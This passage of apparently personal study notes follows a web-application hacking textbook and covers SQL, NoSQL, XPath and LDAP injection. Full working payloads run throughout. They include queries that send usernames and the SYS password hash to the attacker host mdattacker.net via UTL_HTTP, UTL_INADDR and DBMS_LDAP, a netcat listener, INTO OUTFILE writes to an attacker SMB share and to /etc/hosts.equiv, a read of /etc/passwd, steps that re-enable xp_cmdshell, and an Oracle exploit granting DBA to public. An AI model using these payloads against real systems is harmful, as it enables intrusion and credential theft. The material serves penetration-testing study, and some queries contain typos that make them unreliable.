/employees.asp?EmpNo=7521'||UTL_HTTP.request('mdattacker.net:80/'||(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--
```

This URL causes `UTL_HTTP` to make a `GET` request for a URL containing the first username in the table `all_users`. The attacker can simply set up a netcat listener on `mdattacker.net` to receive the result:

```
C:\>nc -nLp 80
GET /SYS HTTP/1.1
Host: mdattacker.net
Connection: close
```

The `UTL_INADDR` package is designed to be used to resolve hostnames to IP addresses. It can be used to generate arbitrary DNS queries to a server controlled by the attacker. In many situations, this is more likely to succeed  than the `UTL_HTTP` attack, because DNS traffic is often allowed out through corporate firewalls even when HTTP traffic is restricted. The attacker can leverage this package to perform a lookup on a hostname of his choice, effectively retrieving arbitrary data by prepending it as a subdomain to a domain name he controls. For example:

```
/employees.asp?EmpNo=7521'||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD20FROM%20DBA_USERS%20WHERE%20NAME='SYS')||'.mdattacker.net')
```

This results in a DNS query to the `mdattacker.net` name server containing the `SYS` user's password hash:
`DCB7481A5BC5390F2.mdattacker.net`

The `UTL-SMTP` package can be used to send e-mails. This facility can be used to retrieve large volums of data captured from the database by sending this in outbound e-mails.

The `UTL_TCP` package can be used to open arbitrary TCP sockets to send and receive network data.

**NOTE: On Oracle 11g, an additional ACL protects many of the resources just desribed from execution by any arbitrary database user. An easy way around this is to dip into the new functionality provided in Oracle 11g and use this code:**

```
SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE NAME='SYS')||'.mdsec.net',80)
```

#### My-SQL
The `SELECT... INTO OUTFILE` command can be used to direct the output from an arbitrary query into a file. The specified filename may contain a UNC path, enabling you to direct the output to a file on your own computer. For example:

```
select * into outfile '\\\\mdattacker.net\\share\\output.txt' from users;
```

To receive file, you need to create an SMB share on you rcomputer that allows anonymous write access. You can configure shares on both Windows and UNIX-based platforms to behave in this way. If you have difficulty receiving the exported file, this may result from a configuration issue in your SMB server. You can use a sniffer to confirm whether the target server is initiating any inbound connections to your computer. If it is, consult your server documentation to ensure that it is configured correctly.


### Using Inference: Conditional Responses
Most commonly out-of-band is unavailable because the database is located within a protected network whose perimeter firewalls do not allow any outbound connections to the Internet or any other network. There are various techniques based on the concept of using an injected query to conditionally trigger some detectable behavior by the database and then inferring a required item of information on the basis of whether this behavior occurs.

For example, submitting the following two pieces of input causes very different results:

```
admin' AND 1=1--
admin' AND 1=2--
```

In the first case, the application logs you in as the admin user. In the second case, the login attempt fails, because the `1=2` condition is always false. You can leverage this control of teh application's behavior as a means of inferring the trugh or falsehood of arbitrary conditions within the database itself. For example, using `ASCII` and `SUBSTRING` functions, you can test whether a specific character of a captured string has a specific value. For example, submitting this peiced of input logs you in as the admin user, because the condition tested is true:

```
admin' AND ASCII(SUBSTRING('Admin',1,1)) = 65--
```

Submitting the following input, however, results in a failed login, because the condition testd is false:

```
admin' AND ASCII(SUBSTRING('Admin'1,1)) = 66--
```

By submitting a large number of such queries, cycling through the range of likely ASCII codes for each character until a hit occurs, you can extract the entire string, one byte at a time.

#### Inducing Conditonal Errors
David Litchfield devised a technique that can be used to trigger a detectable difference in behavior in most circumstances. The core idea is to inject a query that induces a database error contingent on some specified condition. When a database error occurs, it is often externally detectable, either through an HTTP 500 response code or through some kind of error message or anomalous behavior (even if the error message itself does not disclose any useful info). An example of this behavior is a `SELECT` statement containing a `WHERE` clause:

```
SELECT X FROM Y WHERE C
```

This causes the database to work through each row of table `Y`, evaluating condition `C`, and returning `X` in those cases where condition `C` is true. If the condition is never true, the expression is never evaluated.

This behavior can be exploited by finding an expression `X` that is syntactically valid but that generates an error if it is ever evaluated. An example of such an expression in Oracle and MS-SQL is a divide-by-zero computation, such as `1/0`. You can use the presence or absence of an error to test an arbitrary condition `C`.

An example of this is the following query, which tests whether the default Oracle user `DBSNMP` exists. If this user exists, the expression `1/0` is evaluated, causing an error:

```
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'
```

The following query tests whether an invented user `AAAAAA` exists. Because the `WHERE` condition is never true, the expression `1/0` is not evaluated, so no error occurs:

```
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'AAAAAA') = 'AAAAAA'
```

What this technique achieves is a way of inducing a conditional response within the application, even in cases where the query you're injecting has no impact on the application's logic or data processing. This technique is also versatile because it can be used in all kinds of injection points where a subquery can be injected. For example:

```
(select 1 where <<condition>> or 1/0=0)
```

Consider an application that provides a searchable and sortable contacts database. The user controls the parameters `department` and `sort`:

```
/search.jsp?department=30&sort=ename
```

This appears in the following back-end query, which parameterizes the `department` parameter but concatenates the `sort` parameter onto the query:

```
String queryText = "SELECT ename,job,deptno,hiredate FROM emp WHERE deptno = ? ORDER BY " + request.getParameter("sort") + " DESC";
```

It is not possible to alter the `WHERE` clause, or issues a `UNION` query after an `ORDER BY` clause; however, an attacker can create an inference condition by issuing the following statement:

```
/search.jsp?department=20&sort=(select%201/0%20from%20dual%20where%20(select%20substr(max(object_name),1,1)%20FROM%20user_objects)='Y')
```

If the first letter of the first object name in the `user_objects` table is equal to `'Y'`, this will cause the database to attempt to evaluate 1/0. This will result in an error, and on results will be returned by the overall query. If the later is not equal to `'Y'`, results from the original query will be returned in the default order. Carefully supplying this condition to an SQL injectino tool such as Absinthe or SQLMap, we can retrieve every record in the database.

### Using Time Delays
The precise emaning of inducing a suitable time delay depends on the target database being used. MS-SQL contains a built-in `WAITFOR` command, which ca be used to cause a specified time delay. For example, the following query causes a time delay of 5 seconds if the current database user is `sa`:

```
if (select user) = 'sa' waitfor delay '0:0:5'
```

Instead of triggering a different application response when a particular condition is detected, the injected query induces a time delay. For example, the second of these queries causes a time delay, indicating that the first letter of the captured string is A:

```
if ASCII(SUBSTRING('Admin',1,1)) = 64 waitfor delay '0:0:5'
if ASCII(SUBSTRING('Admin',1,1)) = 65 waitfor delay '0:0:5'
```

An additional technique is to break each byte of data into individual bits and retrieve each bit in a single query. The `POWER` command and the bitwise `AND` operator `&` can be used to specify conditions on a bit-by-bit basis. For example, the following query tests the first bit of the first byte of the captured data and pauses if it is 1:

```
if (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,0))) > 0 waitfor delay '0:0:5'
```

The following query performs the same test on the second bit:

```
if (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,1))) > 0 waitfor delay '0:0:5'
```

In current versions of MySQL, the sleep function can be used to create a time delay for a specified number of miliseconds:

```
select if(user() like 'root@%', sleep(5000), 'false')
```

In versions of MySQL prior to 5.0.12, instructing the database to perform a processor-intensive action, such as a SHA-1 hash, many times will result in a measurable time delay. For example:

```
select if(user() like 'root@%', benchmark(5000,sha1('test')), 'false')
```

In PostgreSQL, the `PG_SLEEP` function can be used in the same way as the MySQL sleep function.

In Oracle, you can use `UTL_HTTP` to connect to nonexistent server, causing a timeout.For example:

```
SELECT 'a'||Utl_Http.request('http://madeupserver.com') from dual 
...delay...
ORA-29273: HTTP request failed
ORA-06512: at "SYS.UTL_HTTP", line 1556
ORA-12545: Connect failed because target host or object does not exist.
```

You can leverage this behavior to cause a time delay contingent on some condition that you specify. For example, the following query causes a timeout if the default Oracle account `DBSNMP` exists:

```
SELECT 'a'||Utl_Http.request('http://madeupserver.com') FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'
```

In both Oracle and MySQL databases, you can use the `SUBSTR(ING)` and `ASCII` function to retrive arbitrary information one byte at a time. 

**TIP: We have described the use of time delays as a means of extracting interesting information. However, the time-delay technique can also be immensely useful when performing initial probing of an application to detect SQL injection vulnerabilities. In some cases of completely blind SQL injection, where no results are returned to the browser and all errors are handled invisibly, the vulnerability itself may be hard to detect using standard techniques based on supplying crafted input. In this situation, using time delays is often the most reliable way to detect the present of a vulnerability during initial probing. For example, if the back-end database is MS-SQL, you can inject each of the following strings into each request parameter in turn and monitor how long the application takes to identify any vulnerabilities:**

```
'; waitfor delay '0:30:0'--
1; waitfor delay '0:30:0'--
```


## Beyond SQL Injection: Escalating the Database Attack
Most applications employ a single account for all database access and rely on application-layer controls to enforce segregation of access between different users. Further attacks tha can be performed by escalating the database attack include the following:
- If the database is shared with other applications, you may be able to escalate privileges within the database and gain access to other applications' data.
- You may be able to compromise the OS of the database server.
- You may be able to gain network access to other systems. From the database server, you may be in a trusted position and be able to reach key services on other hosts, which may be further exploitable.
- You may be able to make network connections back out of the hosting infrastructure to your computer. This may enable you to bypass the application, easily transmitting large ammounts of sensitive data gathered from the database, and often evading many intrusion detection systems.
- You may be able to extend the database's existing functionaligy in arbitrary ways by creating usre-defined functions. There is a method for doing this in each of the mainstream databases, provided that you have gained database administrator (DBA) privileges.

### MS-SQL
The `xp_cmdshell` procedure allows users with DBA permissions to execute operating system commands in the same way as the `cmd.exe` command prompt. For example:

```
master..xp_cmdshell 'ipconfig > foo.txt'
```

Attackers can perform arbitrary commands, pipe the results to local files, and read them back. Because MS-SQL runs by default as `LocalSystem`, the attacker typically can fully compromise the underlying operating system, performing arbitrary actions. MS-SQL contains a wealth of other extended stored procedures, such as `xp_regread` and `xp_regwrite`, that can be used to perform powerful actions within the registry of the Windows operating system.

#### Dealing with Default Lockdown
If the web application's user account within the database is sufficiently high-privileged, it is possible to overcome these obstacles simply by reconfiguring the database. For example, if `xp_cmdshell` is disabled, it can be re-enabled with the `sp_configure` stored procedure. The following four lines of SQL do this:

```
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
EXECUTE sp_configure 'xp_cmdshell', '1'
RECONFIGURE WITH OVERRIDE
```

At this point, `xp_cmdshell` is re-enabled and can be run with the usual command:

```
exec xp_cmdshell 'dir'
```

### Oracle
Oracle contains many built-in stored procedures that execute with DBA privileges and have been found to contain SQL injection flaws within the procedures themselves. A typical example of such a flaw existed in the default package `SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES` prior to july 2006 critical patch update. This can be exploited to escalate privileges by injecting the query `grant DBA to public` into the vulnerable field:

```
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDX', 'SCH', 'TEXTINDEXMETHODS".ODCIIndexUtilCleanup(:p1); execute immediate ''declare pragma autonomous_transaction; begin execute immediate '''' grant dba to public''''; end;''; END;--','CTXSYS',1,'1',0) from dual
```

The Java abused OS command execution first exploits a flaw in `DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY` to grant the current user the permission `java.io.filepermission`. The attack then executes a Java class (`oracle/aurora/util/Wrapper`) that runs an OS command, using `DBMS_JAVA.RUNJAVA`. For example:

```
DMBS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c dir>c:\\OUT.LST')
```

More details can be found here:
- [Hacking Aurora](https://www.databasesecurity.com/HackingAurora.pdf)
- [NotSoSecure](https://www.notsesecure.com/folder2/2010/08/02/blackhat-2010/)

### MySQL
One example is the ability of any user with the `FILE_PRIV` permission to read and write to the filesystem. The `LOAD_FILE` command can be used to retrieve the contents of any file. For example:

```
select load_file('/etc/passwd')
```

The `SELECT ... INTO OUTFILE` command can be used to pipe the results of any query into a file. For example:

```
create table test (a varchar(200))
insert into test(a) values ('+ +')
select * from test into outfile '/etc/hosts.equiv'
```

This capability can be used to perform other attacks:
- An attacker with `FILE_PRIV` permissions can simply open the relevant file and read arbitrary data from within the database, bypassing any access controls enforced within the database itself.
- MySQL enables users to create user-defined functions (UDFs) by calling out to a compiled library file that contains the function's implementation. This file must be located within the normal path from which MySQL loads dynamic libraries. An attacker can use the preceding method to create an arbitrary binary file within this path and then create a UDF that uses it. 

## Using SQL Exploitation Tools
**NOTE: The exploitation tool are best suited to extracting data from the database by exploiting an injection point that you have already identified and understood. They are not a magic bullet for finding and exploiting SQL injection flaws. In practice, it is often necessary to provide same additional SQL syntax before and/or after the data injected by the tool for the tool's hard-coded attacks to work.**

> HACK STEPS
> When you  have identified a SQL injection vulnerability, using the techniques described earlier, you can consider using a SQL injection tool to exploit the vulnerability and retrieve interesting data from the database. This option is particularly useful in cases where you need to use blind techniques to retrieve a small amount of data at a time.
>> 1. Run the SQL exploitation tool using an intercepting proxy. Analyze the requests made by the tool as well as the application's responses. Turn on any verbose output options on the tool, and correlate its progress with the obsered queries and responses.
>> 2. Because these kinds of tools rely on preset tests and specific response syntax, it may be necessary to append or prepend data to the string injected by the tool to ensure that the tool gets the expected response. Typical requirements are adding a comment character, balancing the single quotes within the server's SQL query, and appending or prepending closing brackets to the string to match the original query.
>> 3. If the syntax appears to be failing regardless of the methods described here, it is often easiest to create a nested subquery that is fully under your control, and allow the tool to inject into that. This allows the tool to use inference to extract data. Nested queries work well when you inject into standard `SELECT` and `UPDATE` queries. Under Oracle they work within an `INSERT` statement. In each of the following cases, prepend the text occurring before `[input]`, and append the closing bracket occurring after that point:
>>> **Oracle:** '||(select 1 from dual where 1=[input] )
>>> **MS-SQL:** (select 1 where 1=[input] )


In practice, sqlmap is an effective too lfor database information retrieval through time-delay  or other inference methods and can be useful for `UNION`-based retrieval. One of the best ways to use it is with the `--sql-shell` option. This gives the attacker a SQL prompt and performs the necessary `UNION`, error-based, or blind SQL injection behind the scenes to send and retrieve results. For example:

```
C:\sqlmap>sqlmap.py -u http://wahh-app.com/employees?Empno=7369 --union-use --sql-shell -p Empno

	sqlmap/0.8 - automatic SQL injection and database takeover tool 
	http://sqlmap.sourceforge.net

[*] starting at: 14:54:39

[14:54:39] [INFO] using 'C:\sqlmap\output\wahh-app.com\session' as session file
[14:54:39] [INFO] testing connection to the target url
[14:54:40] [WARNING] the testable parameter 'Empno' you provided is not into the Cookie
[14:54:40] [INFO] testing if the url is stable, wait a few seconds
[14:54:44] [INFO] url is stable
[14:54:44] [INFO] testing sql injection on GET parameter 'Empno' with 0 parenthesis
[14:54:44] [INFO] testing unescaped numeric injection on GET parameter 'Empno'
[14:54:46] [INFO] confirming unescaped numeric injection on GET parameter 'Empno'
[14:54:47] [INFO] GET parameter 'Empno' is unescaped numeric injectable with 0 parenthesis
[14:54:47] [INFO] testing for parenthesis on injectable parameter
[14:54:50] [INFO] the injectable parameter requires 0 parenthesis
[14:54:50] [INFO] testing MySQL
[14:54:51] [WARNING] the back-end DBMS is not MySQL
[14:54:51] [INFO] testing Oracle
[14:54:52] [INFO] confirming Oracle
[14:54:52] [INFO] the back-end DBMS is Oracle
web server operating system: Windows 2000
web application technology: ASP, Microsoft IIS 5.0
back-end DBMS: Oracle

[14:54:53] [INFO] testing inband sql injection on parameter 'Empno' with NULL bruteforcing technique
[14:54:58] [INFO] confirming full inband sql injection on parameter 'Empno'
[14:55:00] [INFO] the target url is affected by an exploitable full inband sql injection vulnerability
valid union: 'http://wahh-app.com:80/employees.asp?Empno=7369%20UNOIN%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20DUAL--%20AND%203663=3663'

[14:55:00] [INFO] calling Oracle shell. To quite type 'x or 'q' and press ENTER
sql-shell> select banner from v$version
do you want to retrieve the SQL statement output? [Y/n]
[14:55:19] [INFO] fetching SQL SELECT statement query output: 'select banner from v$version'
select banner from v$version [5]:
[*] CORE              9.2.0.1.0      Production
[*] NLSRTL Version    9.2.0.1.0   -  Production
[*] Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production
[*] PL/SQL Release 9.2.0.1.0    -   Production
[*] TNS for 32-bit Windows: Version 9.2.0.1.0  - Production

sql-shell>
```

## SQL Syntax and Error Reference
Every database produces different error messages whose meanings you need to understand both when probing for flaws and when attempting to craft an effective exploit. Pages 332 to 338 in "The Web Application Hacker's Handbook" contains a brief cheat sheet that you can use to look up the exact syntax you need for a particular task and to decipher any unfamiliar error messages you encounter.

## Injecting into NoSQL
NoSQL data stores represent data using key/value mappings and do not reply on a fixed schema such as a conventional database table. Keys and values can be arbitrarily defined, and the format of the value generally is not relevant to the data store. A futher feature of key/value storage is that a value may be a data structure itself, allowing hierarchical storage, unlike the flat data structure inside a database schema.

Here are some of the common query methods used by NoSQL data stores:
- Key / value lookup
- XPath 
- Programming languages such as JavaScript

### Injecting into MongoDB
If queries are built using string concatenation, an attacker can attempt to break out of the data context and alter the query's syntax. Consider the following example, which performs a login based on user records in a MongoDB data store:

```
$m = new Mongo();
$db = $m->cmsdb;
$collection = $db->user;
$js = "function() {
	return this.username == '$username' & this.passwd == '$passwd'; }";

$obj = $collection->findOne(array('$where' => $js));

if (isset($obj["uid"])){
	$logged_in=1;
} else {
	$logged_in=0;
}
```

`$js` is a JavaScript function, the code for which is constructed dynamically and includes the user-supplied username and password. An attacker can bypass the authentication logic by supplying a username:

`Marcus'//`

and any password. The resulting JavaScript function looks like this:

`function() {return this.username == 'Marcus'//' & this.password == 'aaa'; }`

**NOTE: In JavaScript, a double forward slash (//) signifies a rest-of-line comment, so the remaining code in the function is commented out. 
An alternative means of ensureing that the `$js` function always returns a `true`, without using a comment, would be to supply a username of:**

```
a' || 1==1 || 'a'=='a
```

**JavaScript interprets the various operators like this:**

```
(this.username == 'a' || 1==1) || ('a' == 'a' & this.password == 'aaa');
```

**This results in all of the resources in the user collection being matched, since the first disjunctive condition is always true (1 is always equal to 1).**


## Injecting into XPath
The XML Path Language is an interpreted language used to navigate around XML documents and to retrieve data from within them. 

Where web applications store data within XML documents, they may use XPath to access the data in response to user-supplied input. If this input is inserted into the XPath query without any filtering or sanitization, an attacker may be able to manipulate the query to interfere with the application's logic or retrieve data for which she is not authorized.

XML documents, are frequently used to store application configuration data that may be retrieved on the basis of user input.

Consider the following XML data store:

```
<addressBook>
	<address>
		<firstName>William</firstName>
		<surname>Gates</surname>
		<password>MSRocks!</password>
		<email>billyg@microsoft.com</email>
		<ccard>5130 8190 3282 3515</ccard>
	</address>
	<address>
		<firstName>Chris</firstName>
		<surname>Dawes</surname>
		<password>secret</password>
		<email>cdawes@crafnet.de</email>
		<ccard>3981 2491 3242 3121</ccard>
	</address>
	<address>
		<firstName>James</firstName>
		<surname>Hunter</surname>
		<password>letmein</password>
		<email>james.hunter@pookmail.com</email>
		<ccard>8113 5320 8014 3313</ccard>
	</address>
</addressBook>
```

An XPath query to retrieve all e-maill addresses would look like this:

```
//address/email/text()
```

A query to return all the details of the user Dawes would look like this:

```
//address[surname/text()='Dawes']
```

### Subverting Application Logic
The following XPath query effectively verifies the user-supplied credentials and retrievse the relevant user's credit card number:

```
//address[surname/text()='Dawes' and password/text()='secret']/ccard/text()
```

In this case an attacker may be able to subvert the application's query in an identical way to a SQL injection flaw. For example, supplying a password with this value:

```
' or 'a'='a
```

results in the following XPath query, which retrieves the credit card details of all users:

```
//address[surname/text()='Dawes' and password/text()='' or 'a'='a']/ccard/text()
```

**NOTE:**
- **As with SQL injection, single quotation marks are not required when injecting into a numeric value.**
- **Unlike SQL queries, keywords in XPath queries are case-sensitive, as are the element names in the XML document itself.**

### Informed XPath Injection
Submitting the following two password will result in different behavior by the application. Results are returned in the first case but not in the second:

```
' or 1=1 and 'a'='a
' or 1=2 and 'a'='a
```

This difference in behavior can be leveraged to test the truth of any specified condition, and therefore, extract arbitrary information one byte at a time. As with SQL, the XPath language contains a substring funciton that can be used to test the value of a string one character at a time. For example, supplying this password:

```
' or //address[surname/text()='Gates' and substring(password/text(),1,1)='M'] and 'a'='a
```

results in the following XPath query, which returns results if the first character of the Gates user's password is `M`:

```
//address[surname/text()='Dawes' and password/text()=''  or //address[surname/text()='Gates' and substring(password/text(),1,1)='M'] and 'a'='a ']/ccard/text()
```


### Blind XPath Injection
It is possible to mount a fully blind attack without posessing information about the absolute path to the extracted data(`address`) and the names of the targeted fields (`surname` and `password`). XPath queries can contain steps that are relative to the current node within the XML document, so from the current node it is possible to navigate to the parent node or to a specific child node. Furthermore, XPath contains functions to query meta-information about the document, including the name of a specific element. 

For example, you can use the substring technique to extract the name of the current node's parent by supplying a series of passwords of this form:

```
'or substring(name(parent::*[position()=1]),1,1)='a
```

This input generates results, because the first letter of the `address` node is `a`. Moving on to the second letter, you can confirm that this is `d` by supplying the following passwords, the last of which generates results:

```
'or substring(name(parent::*[position()=1]),2,1)='a
'or substring(name(parent::*[position()=1]),2,1)='b
'or substring(name(parent::*[position()=1]),2,1)='c
'or substring(name(parent::*[position()=1]),2,1)='d
```

Specifying the relevant child node by index avoids the need to know the names of any nodes. For example, the following query returns the value `Hunter`:

```
//address[position()=3]/child:node()[position()=4]/text()
```

And the following query returns the value `letmein`:

```
//address[position()=3]/child::node()[position()=6]/text()
```

This technique can be used in a completely blind attack, where no results are returned within the application's reponses, by crafting an injected condition that specifies the target node by index. For example, supplying the following password returns results if the character of Gates' password is `M`:

```
' or substring(//address[position()=1]/child::node()[position()=6]/text(),1,1)= 'M' and 'a'='a
```

**TIP: XPath contains two useful functions that can help you automate the preceding attack and quickly iterate through all nodes and data in the XML document:**
- `count()` **returns the number of child nodes of a given element, which can be used to determine range of `position()` values to iterate over.**
- `string-length()` **returns the length of a supplied string, which can be used to determine the range of `substring()` values to iterate over.**


### Finding XPath Injection Flaws
Many of the attack strings that are commonly used to probe for SQL injection flaws typically result in anomalous behavior when submitted to a function that is vulnerable to XPath injection. For example, either of the following two strings usually invalidates the XPath query syntax and generates an error:

```
'
'--
```

One or more of the following strings typically result in some change in the application's behavior without causing an error, in the same way as they do in relation to SQL injection flaws:

```
' or 'a'='a
'a and 'a'='b
or 1=1
and 1=2
```

Hence, in any situation where your tests for SQL injection provide tentative evidence for a vulnerability, but you're unable to conslusively exploit the flaw, you should investigate the possibility that you're dealing with an XPath injection flaw.

> HACK STEPS
>> 1. Try submitting the following values, and determine whether these results in different application behavior, without causing an error:
>> `' or count(parent::*[position()=1])=0 or 'a'='b`
>> `' or count(parent::*[position()=1])>0 or 'a'='b`
>> If the parameter is numeric, also try the following test strings:
>> `1 or count(parent::*[position()=1])=0`
>> `1 or count(parent::*[position()=1])>0`
>
>>2. If any of the preceding strings causes differential behavior within the application without causing an error, it is likely that you can extract arbitrary data by crafting test conditions to extract one byte of information at a time. Use a series of conditions with the following form to determine the name of the current node's parent:
>>`substring(name(parent::*[position()=1]),1,1)='a'`
>
>> 3. Having extracted the name of the parent node, use a series of conditions with the following form to extract all the data within the XML tree:
>> `substring(//parentnodename[position()=1]/child::node()[position()=1]/text(),1,1)='a'`



## Injecting into LDAP
The Lightweight Directory Access Protocol (LDAP) is used to access directory services over a network. A direcory is a hierarchical organized data store that may contain any kind of information but is commonly used to store personal data such as names, telephone numers, e-mail addresses, and job functions. 

You're most likely to encounter LDAP being used in corporate intranet-based web applications. Each LDAP query usese one or more search filters, which determine the directory entries that are returned by the query. The most common search filters you're likely to encounter are as follows:

- **SImple match condition** match on the value of a single attribute. For example, an application function that searches for a user via his username might use this filter:
`(username=daf)`
- **Disjunctive queries** specify multiple conditions, any of which must be satisfied by entries that are returned. For example, a search function that looks up a user-supplied search term in several directory attributes might use this filter:
`(|(cn=searchitem) (sn=searchitem) (ou=searchitem))`
- **Conjunctive queries** specify multiple conditions, all of which must be satisfied by entries that are returned. For example, a login mechanism implemented in LDAP mist use this filter:
`(&(username=daf)(password=secret)`

In general, LDAP injection vulnerabilities are not as readily exploitable as SQL injection flaws, due to the following factors:
- Where the search filter employs a logical operator to specify a conjunctive or disjunctive quyer, this usually appears before the point where user-supplied data is inserted and therefore cannot be modified. Hence, simple match conditions and conjunctive queries don't have an equivalent to the "or 1=1" type of attack that arises with SQL injection.
- In the LDAP implementations that are common use, the directory attributes to be returned are passed to the LDAP APIs as a separate parameter from the search filter and normally are hard-coded within the application. Hence, it usually is not possible to manipulate user-supplied input to retrieve different attributes that the query was intended to retrieve.
- Applications rarely return information error messages, so vulnerabilities generally need to exploited "blind".

## Exploiting LDAP Injection
The details of LDAP exploitation works typically are highly dependent on the construction of the search filter, the entry point for user input, and the implementation details of the back-end LDAP service itself.

### Disjunctive Queries
Consider an application that lets users list employees within a specified department of the business. The search results are restricted to the geographic locations that the user is authorized to view. If a user is authorised to view the London and Reading locations, and he searches for the "sales" department, the application performs the following disjunctive query:

```
(|(department=London sales) (department=Reading sales))
```

In this situation, an attacker can subvert the query to return details of all employees in all locations by submitting the following query term:

```
)(department=*
```

The `*` character is a wildcard in LDAP; it matches any item. When this input is embedded into the LDAP search filter, the following query is performed:

```
(|(department=London) (deparment=*) (department=Reading) (department=*))
```

Since this is a disjunctive query and contains the wildcard term `(department=*)`, it matches on all directory entries. It returns the details of all employees from all locations, thereby subverting the application's access control.

### Conjunctive Queries
Consider a small application function that allows users to search for employees by name, again within the geographic region they are authorized to view. If a user is authorized to search within the London location, and he searches for the name `daf`, the following query is performed:

```
(&(givenName=daf) (department=London*))
```

In this situation, two different attacks might succeed, depending on the details of the back-end LDAP service. Some LDAP implementations, including OpenLDAP, allow multiple search filters to be batched, and these are applied disjunctively. (In other words, directory entries are returned that macy any of the batched filters.) For example, an attacker could supply the following input:

```
*)) (&(givenName=daf
```

When this input is embedded into the original search filter, it becomes:

```
(&(givenName=*)) (&(givenName=daf) (department=London*))
```

This now contains two search filters, the first of which contains a simgle wildcard match condition. The details of all employees are returned from all locations, thereby subverting the application's access control.

**NOTE: This technique of injecting a second search filter is also effective against simple match conditions that do not employ any logical operator, provided that the back=end implementation accepts multiple search filters.**

The second type of attack against conjunctive queries exploits how many LDAP implementations handle `NULL` bytes. Because these implementations typically are written in native code, a `NULL` byte within a search filter effectively terminates the string, and any character coming after the `NULL` are ignored, similar to `--` in SQL. 

In the preceding example, the attacker can supply the following input:

```
*))%00
```

The `%00` sequence is decoded by the application server into a literal `NULL` byte, so when the input is embedded into the search filter, it becomes:

```
(&(givenName=*)) [NULL]) (department=London*))
```

Because this filter is truncated at the `NULL` byte, as far as LDAP is concerned it contains only a single wildcard condition, so the details of all employees from departments outside the London area are also returned.


## Finding LDAP Injection Flaws
> HACK STEPS
>> 1. Try entering just the `*` character as a search term. This character functions as a wildcard in LDAP, but not in SQL. If a large number of results are returned, this is a good indicator that you're dealing with an LDAP query.
>> 2. Try entering a number of closing brackets: `))))))))))`
>> This input closes any brackets enclosing your input, as well as those that encapsulate the main search filter itself. This results in unmatched closing brackets, thus invalidating the query syntax. If an error results, the application may be vulnerable to LDAP injection. (Note that this input may also break many other kinds of application logic, so this provides a strong indicator only if you're already confident that you are dealing with an LDAP query.)
>> 3. Try entering various expressions designed to interfere with different types of queries, and see if these allow you to influence the results being returned. The `cn` attribute is supported by all LDAP implementations and is useful to use if you do not know any details about the directory you're querying. For example:
>> `)(cn=*`
>> `*))(|(cn=*`
>> `*))%00`



